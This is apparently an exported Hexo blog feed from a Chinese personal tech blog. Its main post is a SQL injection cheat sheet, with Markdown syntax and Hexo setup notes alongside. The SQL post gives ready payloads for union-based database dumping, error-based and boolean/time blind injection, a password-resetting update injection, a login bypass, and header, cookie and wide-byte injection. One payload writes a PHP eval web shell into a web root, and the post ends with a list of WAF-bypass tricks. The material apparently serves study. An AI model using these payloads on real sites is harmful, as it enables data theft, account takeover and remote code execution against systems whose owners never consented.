href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2023/09/03/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/09/03/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<img src="/2023/09/03/sql%E6%B3%A8%E5%85%A5/sql.jpg" class title="图片"><span id="more"></span><h1 id="1-1-sql注入标准流程"><a href="#1-1-sql注入标准流程" class="headerlink" title="1.1 sql注入标准流程"></a>1.1 sql注入标准流程</h1><hr><p><strong>1、推测其数据库的大致语法</strong></p><p>eg：<code>select * from 某表 where id = ‘xx’ limit 0,1</code></p><p><strong>2、通过错误写入让其报错，显示其闭合方式</strong></p><p>\ 是转义字符，把后面第一个东西变成字符串</p><p>select user,pass from user where id &#x3D; ‘2\‘ limit 0,1 </p><p>等价于select user,pass from user where id &#x3D; ‘2’&#39; limit 0,1 </p><p>这样闭合错误就会报错！</p><p><em>一些常用的闭合方法：</em></p><ul><li>‘ ’</li><li>” “</li><li>( )</li><li>(‘ ‘)</li><li>(“ “)</li><li>(( ))</li><li>((‘ ‘))</li><li>((“ “))</li><li><strong>` `</strong></li><li>(% %)    #搜索框常见</li></ul><p><strong>3、验证其闭合方式</strong></p><p>例如是 ’ ‘ 闭合，则输入<code>2&#39; --+</code>，若查询成功说明闭合正确</p><p>–相当于注释符，+相当于空格，–+会注释掉后面的内容</p><p><strong>4、确认有多少列</strong></p><p><code>select * from 某表 where id = ‘xx’ order by 5</code></p><p><code>select * from 某表 where id = ‘xx’ order by 3</code></p><p>当小于或等于其正确数列时，才会查询成功</p><p><strong>5、联合查询，显示报错位</strong></p><p><code>select * from 某表 where id = ‘-1’ union select 1,2,3 --+</code></p><p>使union前查询出错即可，即会显出网站的报错位</p><p><strong>6、开始爆库和其他内容</strong></p><p><code>-1’ union select 1,database(),3 --+</code>  库</p><p><code>-1’ union select 1,version(),3 --+</code>   当前版本</p><p><code>-1’ union select 1,user(),3 --+</code>   当前用户</p><p><code>-1’ union select 1,@@datadir,3 --+</code>  数据库物理路径</p><p><strong>7、爆表</strong></p><p>一条一条查：</p><p><code>-1’ union select 1,table_name,3 from information_schema.tables where table_schema=&#39;库名&#39; limit 0,1 --+</code></p><p>也可以一起查：<br><code>-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;库名&#39; --+</code></p><p><strong>8、查列</strong></p><p><code>-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;库名&#39; and table_name=&#39;表名&#39; --+</code></p><p><strong>9、查字段</strong></p><p><code>-1&#39; union select 1,group_concat(列名),3 from 表名 --+</code></p><h1 id="1-2-报错注入"><a href="#1-2-报错注入" class="headerlink" title="1.2 报错注入"></a>1.2 报错注入</h1><hr><p>当发现数据库除了报错信息外，其他没有任何反应，此时考虑报错注入</p><p><code>1&#39; AND (select 1 from (select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+</code></p><p>简单高效的两种：</p><p><code>id=1&#39; and extractvalue(1,concat(0x7e,(database()),0x7e)) --+</code></p><p><code>id=2&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) --+</code></p><h1 id="1-3-1-布尔盲注"><a href="#1-3-1-布尔盲注" class="headerlink" title="1.3.1 布尔盲注"></a>1.3.1 布尔盲注</h1><hr><p>使用情况：这个地方有数据库查询，但是没有显示位，会报错但是不出现信息，错误和正确的页面有区别</p><p>id&#x3D;2’ and 0 –+<br>id&#x3D;2’ and 1&lt;2 –+<br>查询成功则说明可以夹带私货</p><p>相关小知识：</p><p><code>select length(database())</code>计算数据库库名有几个字</p><p><code>select substr(database(),1,1)</code>截取数据库库名，从第1个字开始截取1位</p><p><code>select ascii(substr(database(),1,1))</code>把这个内容转为ASCII码</p><p>操作大致位一个一个字符去查询</p><p><code>id=1&#39; and (select ascii(substr(database(),1,1))) &lt; 115 --+</code></p><p>走流程：</p><p><code>id=1&#39; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#39;库名&#39; limit 0,1),1,1))) &lt; 115 --+</code></p><p>实战时基本都交给sqlmap去操作</p><h1 id="1-3-2-布尔时间盲注"><a href="#1-3-2-布尔时间盲注" class="headerlink" title="1.3.2 布尔时间盲注"></a>1.3.2 布尔时间盲注</h1><hr><p>使用情况：这个地方有数据库查询，但是没有显示位，也不会出现信息，错误也不会告诉你</p><p>相关小知识：</p><p>select sleep(5);<br>数完5s后输出一个0</p><p><code>select if((select database())=&#39;haha&#39;,sleep(5),null)</code><br>判断一下数据库的库名是否为haha，是就睡5s，不是就不管</p><p>实际操作：</p><p>1、先判断是否可以睡觉</p><p><code>id=1&#39; and sleep(5) --+</code></p><p>2、查库</p><p><code>id=1&#39; and if((select database())=&#39;库名&#39;,sleep(5),null) --+</code></p><p>3、走流程</p><p><code>id=1&#39; and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)=&#39;e&#39;,sleep(5),null) --+</code></p><p>……一般还是交给sqlmap搞定</p><h1 id="1-4-Update注入"><a href="#1-4-Update注入" class="headerlink" title="1.4 Update注入"></a>1.4 Update注入</h1><hr><p>常见于密码更新sql语句，会更改数据库中所有的密码，危害较大谨慎使用</p><p><code>&#39; or 1=1 #</code></p><p><code>update users set password=&#39; &#39; or 1=1 # &#39; where username=&#39; admin &#39;</code></p><h1 id="1-5-POST注入"><a href="#1-5-POST注入" class="headerlink" title="1.5 POST注入"></a>1.5 POST注入</h1><hr><p><em>法一：</em></p><p>万能密码：”) or 1&#x3D;1 #</p><p><code>select username,password from [表] where username=(&quot; &quot;) or 1=1 # &quot;) and password=(&quot; &quot;) limit 0,1</code></p><p><em>法二：</em></p><p>使用burpsuite抓包，抓的包送至repeater模块</p><p>接着走常规流程</p><h1 id="1-6-1-http头注入"><a href="#1-6-1-http头注入" class="headerlink" title="1.6.1 http头注入"></a>1.6.1 http头注入</h1><hr><p>一些网站会获取你的User-Agent并记录在他的数据库中</p><p>推测其大致sql语句为</p><p><code>insert into &#39;security&#39;.&#39;某个表&#39; (uagent,ipadd,username) values(&#39;浏览器信息&#39;,&#39;ip地址&#39;,&#39;用户名&#39;)</code></p><p>注入点通常在浏览器信息即User-Agent这块</p><p>通常post无法使用注释符，常用<code>and &#39;1&#39;=&#39;1</code>来闭合</p><p>实操</p><p><code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1</code></p><p>原句</p><p><code>insert into &#39;security&#39;.&#39;某个表&#39; (uagent,ipadd,username) values(&#39;&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1&#39;,&#39;ip地址&#39;,&#39;用户名&#39;)</code></p><h1 id="1-6-2-reffer-cookie注入"><a href="#1-6-2-reffer-cookie注入" class="headerlink" title="1.6.2 reffer,cookie注入"></a>1.6.2 reffer,cookie注入</h1><hr><p>reffer即来路</p><p>两者的注入方式于http注入类似</p><h1 id="1-7-宽字节注入"><a href="#1-7-宽字节注入" class="headerlink" title="1.7 宽字节注入"></a>1.7 宽字节注入</h1><hr><p>mysql用gbk编码，把2个字符当做一个汉字</p><p>%df把\吃掉，因为\进行url编码为%5c，而%df%5c为一个汉字，然而汉字是不会被解析出来的，就会当做一个空格，这样单引号就可以独立出来了</p><p><code>id=-2%df&#39;union select 1,2,3 --+</code></p><p>如果碰到post类型<br>burp抓包，在目标位置<code>admin%df%27 union select 1,2 # </code><br>把%df%27框起来，右键–convert selection–url—url decode</p><p>因为get会自动把数据进行url解码！！！！post不会把数据进行url解码！！！！</p><h1 id="1-8-文件相关注入"><a href="#1-8-文件相关注入" class="headerlink" title="1.8 文件相关注入"></a>1.8 文件相关注入</h1><hr><p>相关知识：</p><p>apache网站位置:&#x2F;var&#x2F;www&#x2F;html;旧版本apache网络位置&#x2F;var&#x2F;www</p><p>取出数据并写入文件：<code>select * from 某表 into outfile &quot;文件路径&quot;;</code></p><p>显示某个文件：<code>select load_file(“文件路径”);</code></p><p>加载某个文件并转存：<code>select load_file(&quot;文件路径&quot;) into outfile (&quot;文件路径&quot;)</code></p><p>实操：</p><p><code>index.php?id=1&#39;) union select 1,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;,3 into outfile &quot;/var/www/html/haha.php&quot; --+</code></p><p><code>index.php?id=1&#39;) union select 1,load_file(&quot;c:/flag.txt&quot;),3 into outfile &quot;/var/www/html/haha1.txt&quot; --+</code></p><h1 id="2-1-一些绕过waf技巧"><a href="#2-1-一些绕过waf技巧" class="headerlink" title="2.1 一些绕过waf技巧"></a>2.1 一些绕过waf技巧</h1><hr><ol><li><p>大小写绕过<br>Union SelEcT</p></li><li><p>双写绕过<br>uniunionon</p></li><li><p>编码绕过<br>security–》hex<br>urlencode</p></li><li><p>注释符绕过<br>uni&#x2F;<strong>&#x2F;on sel&#x2F;</strong>&#x2F;ect</p></li><li><p>空格绕过</p><p>替代空格的东西</p><p>%09 水平tab键</p><p>%0a 新建一行</p><p>%0c 新建一页</p><p>%0d 回车键</p><p>%0b 垂直tab键</p><p>%a0 空格键</p></li><li><p>or and 绕过</p></li><li><p>单引号</p></li><li><p>反引号<br>大多数情况下，反引号只能出现在表名，有的时候表名和数据库某个语法语句类似的，否则数据库会误以为是语法<br>select * from`from` where id&#x3D;1</p></li><li><p>内联注释<br>and &#x2F;<em>!select</em>&#x2F; 1,2</p></li><li><p>&lt;&gt;绕过<br>un&lt;&gt;ion se&lt;&gt;lect</p></li></ol><p>​select * from users where id&#x3D;1 and ascii(substr(database(),1,1)) &gt; 115<br>greatest least</p><p>​select * from users where id&#x3D;1 and greatest(ascii(substr(database(),1,1)),115)</p><ol start="11"><li>屏蔽逗号<br>select substr(“xxxxxx”,1,3)<br>select substr(“xxxxxx” from 1 to 3)</li></ol><p>​union select 1,2,3;<br>​union select * from (select 1)a join (select 2)b join (select 3)c;</p><p>​limit 0,1<br>​limit 0 offset 1</p><ol start="12"><li><p>屏蔽sleep<br>and sleep(1)<br>and benchmark(10000000000,1)</p></li><li><p>group_concat屏蔽<br>select group_concat(“haha”,”nihao”)<br>select concat_ws(“”,”haha”,”nihao”)</p></li><li><p>等号屏蔽<br>like rlike regexp &lt;&gt;<br>id&#x3D;1’ or 1 like 1<br>id&#x3D;1’ or 1 &lt;&gt; 1</p></li><li><p>post情况屏蔽#<br>id&#x3D;3”) or 1&#x3D;1 – a</p></li><li><p>ip地址拦截<br>X-Forwarded-For:<br>X-remote-IP<br>X-Originating-IP<br>X-remote-addr<br>X-Real-IP</p></li><li><p>修改静态资源<br><a href="http://www.xxx.com/sql.php?id=1">www.xxx.com/sql.php?id=1</a><br>可以替换为<br><a href="http://www.xxx.com/sql.php/1.js?id=1">www.xxx.com/sql.php/1.js?id=1</a></p></li><li><p>url白名单绕过<br>为了防止防火墙误伤，会设置白名单&#x2F;admin.php manager system</p></li></ol><p>​<a href="http://www.xxx.com/sql.php?id=1">www.xxx.com/sql.php?id=1</a><br>​<a href="http://www.xxx.com/sql.php/admin.php?id=1">www.xxx.com/sql.php/admin.php?id=1</a><br>​<a href="http://www.xxx.com/sql.php?xxxx=/manager/&b=%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">www.xxx.com/sql.php?xxxx=/manager/&amp;b=攻击代码</a><br>​<a href="http://www.xxx.com/sql.php?id=1">www.xxx.com/../../../../manager/../../../sql.php?id=1</a></p><ol start="19"><li><p>爬虫白名单<br>伪造自己是搜索引擎（修改ua）</p></li><li><p>数据库注释执行<br>&#x2F;<em>!50001 select * from users</em>&#x2F;<br>如果数据库是5.00.01以下的才会执行</p></li><li><p>增加干扰<br>union all %23%a0 select 1,2,3</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>markdown基本语法</title>
    <link href="/2023/08/30/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <url>/2023/08/30/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<blockquote><p>如果说写纸质笔记的基础是会用笔,那么电子笔记的基础则是掌握markdown语法:)</p></blockquote><p>略微整理一下常用的语法，不定期补充</p><p>Let’s begin </p><span id="more"></span><h2 id="1、引言"><a href="#1、引言" class="headerlink" title="1、引言 &gt;"></a>1、引言 &gt;</h2><p>&gt; 我是一条引言</p><p>&gt;&gt; 嵌套引言</p><p>效果：</p><blockquote><p>我是一条引言</p><blockquote><p>嵌套引言</p></blockquote></blockquote><h2 id="2、标题"><a href="#2、标题" class="headerlink" title="2、标题 #"></a>2、标题 #</h2><p># 一级标题</p><p>## 二级标题</p><p>### 三级标题</p><p>#### 四级标题</p><p>##### 五极标题</p><p>###### 六级标题</p><h2 id="3、正文"><a href="#3、正文" class="headerlink" title="3、正文"></a>3、正文</h2><p>正文直接写就ok了</p><p>在vscode里正文双换行表示换行</p><h2 id="4、代码"><a href="#4、代码" class="headerlink" title="4、代码 `"></a>4、代码 `</h2><h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h4><p>```python</p><p>print(“我是python代码”)</p><p>```</p><p>效果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我是python代码&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="行内代码"><a href="#行内代码" class="headerlink" title="行内代码"></a>行内代码</h4><p>`print(“行内代码”)`</p><p>效果：</p><p><code>print(&quot;行内代码&quot;)</code></p><h2 id="5、列表"><a href="#5、列表" class="headerlink" title="5、列表"></a>5、列表</h2><h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><p>数字加点加空格即可</p><ol><li>a</li><li>b</li><li>c</li></ol><h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><p><strong>-</strong> （小小的也很可爱捏）</p><p>- a</p><p>- b</p><p>- c</p><p>效果：</p><ul><li>a</li><li>b</li><li>c</li></ul><h2 id="6、加粗和倾斜"><a href="#6、加粗和倾斜" class="headerlink" title="6、加粗和倾斜"></a>6、加粗和倾斜</h2><p>**我变粗辣**  —&gt;  <strong>我变粗辣</strong></p><p>*比萨斜字* —&gt;  <em>比萨斜字</em></p><h2 id="7、分割线"><a href="#7、分割线" class="headerlink" title="7、分割线"></a>7、分割线</h2><p>***</p><p>---</p><p>___</p><p>使用三个及以上的*****  <strong>-</strong>  <strong>_</strong></p><h2 id="8、-超链接"><a href="#8、-超链接" class="headerlink" title="8、 超链接"></a>8、 超链接</h2><p>[]()</p><p>[链接名](链接地址)</p><h2 id="9、待办清单"><a href="#9、待办清单" class="headerlink" title="9、待办清单"></a>9、待办清单</h2><p>- [ ] 待办事件1</p><p>- [x] 已完成事件</p><p>效果：</p><ul><li><input disabled type="checkbox"> 待办事件1</li><li><input checked disabled type="checkbox"> 已完成事件</li></ul><h2 id="10、图片插入"><a href="#10、图片插入" class="headerlink" title="10、图片插入"></a>10、图片插入</h2><p>常规插入   </p><p><strong>![]()</strong></p><p>图片标签插入 </p><p><code>&#123;% asset_img 图片.jpg 这是一张图片%&#125;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo相关</title>
    <link href="/2023/08/30/hexo%E7%9B%B8%E5%85%B3/"/>
    <url>/2023/08/30/hexo%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<hr><span id="more"></span><h2 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h2><h3 id="1-1-发布文章"><a href="#1-1-发布文章" class="headerlink" title="# 1.1 发布文章"></a><strong># 1.1 发布文章</strong></h3><p>进入博客所在目录，右键打开 Git Bash Here，创建博文：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;My New Post&quot;</span><br></pre></td></tr></table></figure><p>然后 source 文件夹中会出现一个 My New Post.md 文件，就可以使用 Markdown 编辑器在该文件中撰写文章了。</p><p>写完后运行下面代码将文章渲染并部署到 GitHub Pages 上完成发布。<strong>以后每次发布文章都是这两条命令。</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g   # 生成页面</span><br><span class="line">hexo d   # 部署发布</span><br></pre></td></tr></table></figure><hr><p>也可以不使用命令自己创建 .md 文件，只需在文件开头手动加入如下格式 Front-matter 即可，写完后运行 <code>hexo g</code> 和 <code>hexo d</code> 发布。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World # 标题</span><br><span class="line">date: 2019/3/26 hh:mm:ss # 时间</span><br><span class="line">categories: # 分类</span><br><span class="line">- Diary</span><br><span class="line">tags: # 标签</span><br><span class="line">- PS3</span><br><span class="line">- Games</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">摘要</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">正文</span><br></pre></td></tr></table></figure><h3 id="1-2-网站设置"><a href="#1-2-网站设置" class="headerlink" title="# 1.2 网站设置"></a><strong># 1.2 网站设置</strong></h3><p>包括网站名称、描述、作者、链接样式等，全部在网站目录下的 _config.yml 文件中，参考<a href="https://link.zhihu.com/?target=https://hexo.io/zh-cn/docs/configuration">官方文档</a>按需要编辑。</p><p>注意：冒号后要加一个空格！</p><h3 id="1-3-更换主题"><a href="#1-3-更换主题" class="headerlink" title="# 1.3 更换主题"></a><strong># 1.3 更换主题</strong></h3><p>在 <a href="https://link.zhihu.com/?target=https://hexo.io/themes/">Themes | Hexo</a> 选择一个喜欢的主题，比如 <a href="https://link.zhihu.com/?target=http://theme-next.iissnan.com/getting-started.html">NexT</a>，进入网站目录打开 Git Bash Here 下载主题：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>然后修改 _config.yml 中的 theme 为新主题名称 next，发布。（有的主题需要将 _config.yml 替换为主题自带的，参考主题说明。）</p><h3 id="1-4-常用命令"><a href="#1-4-常用命令" class="headerlink" title="# 1.4 常用命令"></a><strong># 1.4 常用命令</strong></h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;name&quot;       # 新建文章</span><br><span class="line">hexo new page &quot;name&quot;  # 新建页面</span><br><span class="line">hexo g                # 生成页面</span><br><span class="line">hexo d                # 部署</span><br><span class="line">hexo g -d             # 生成页面并部署</span><br><span class="line">hexo s                # 本地预览</span><br><span class="line">hexo clean            # 清除缓存和已生成的静态文件</span><br><span class="line">hexo help             # 帮助</span><br></pre></td></tr></table></figure><h2 id="2-常见问题"><a href="#2-常见问题" class="headerlink" title="2 常见问题"></a>2 常见问题</h2><p><strong>1、Hexo 设置显示文章摘要，首页不显示全文</strong></p><p>Hexo 主页文章列表默认会显示文章全文，浏览时很不方便，可以在文章中插入 <code>&lt;!--more--&gt;</code> 进行分段。</p><p>该代码前面的内容会作为摘要显示，而后面的内容会替换为 “Read More” 隐藏起来。</p><img src="/2023/08/30/hexo%E7%9B%B8%E5%85%B3/v2-45701cf120ca77e6733ad30b40666f33_1440w.webp" class><p><img src="/hexo%E7%9B%B8%E5%85%B3/v2-45701cf120ca77e6733ad30b40666f33_1440w.webp" alt="img"></p><p><strong>2、设置网站图标</strong></p><p>进入 themes&#x2F;主题 文件夹，打开 _config.yml 配置文件，找到 favicon 修改，一般格式为：<code>favicon: 图标地址</code>。（不同主题可能略有差别）</p><p><strong>3、修改并部署后没有效果</strong></p><p>使用 <code>hexo clean</code> 清理后重新部署。</p><p><strong>4、开启 HTTPS 后访问网站显示连接不安全？</strong></p><p>证书还未部署生效，等待一会儿，清除浏览器缓存再试。</p><p><strong>5、Mac 安装 Hexo 报错无法安装</strong></p><p>Mac 用户需要管理员权限运行，使用 <code>sudo npm install -g hexo-cli</code> 命令安装。</p><p><strong>6、npm 下载速度慢，甚至完全没反应</strong></p><p>使用 npm 安装程序等待很久也没反应，或者下载速度很慢，可以更换 npm 源为国内 npm 镜像。</p><p>临时更换方法：在 npm 安装命令后面加上：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--registry https://registry.npm.taobao.org </span><br></pre></td></tr></table></figure><p>Hexo 博客文件夹目录结构如下：</p><img src="/2023/08/30/hexo%E7%9B%B8%E5%85%B3/v2-264c75c0e493ae8cc5f283567c64ff2c_1440w.webp" class><p><img src="/hexo%E7%9B%B8%E5%85%B3/v2-264c75c0e493ae8cc5f283567c64ff2c_1440w.webp" alt="img"></p><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>A Test</title>
    <link href="/2023/08/29/A-Test/"/>
    <url>/2023/08/29/A-Test/</url>
    
    <content type="html"><![CDATA[<p>哈哈、、（试试更新功能O.o）</p><p>整了个来小时算是初具雏形了，暂时先用默认的主题吧，待以后有时间再美化一下。千里之行，始于足下。从这开始记录成长的点点滴滴罢。</p><p><img src="https://github.com/w1t2f3/w1t2f3.github.io/blob/main/2023/10/17/A-Test/2022-10-04(9).png?raw=true"></p><span id="more"></span><p>markdown功能还挺多，嘿嘿嘿嘿嘿</p><p><img src="/A-Test/2022-08-20(27).png" alt="2022-08-20 (27)"></p><p>俺的图图呢？</p><img src="/2023/08/29/A-Test/2022-08-20(27).png" class title="这是一张图片"><p>啊啊？</p><img src="/2023/08/29/A-Test/2022-10-04(9).png" class title="这是一张图片"><p>找到捏 lol，原来是图片名称里面不能有空格qwq</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
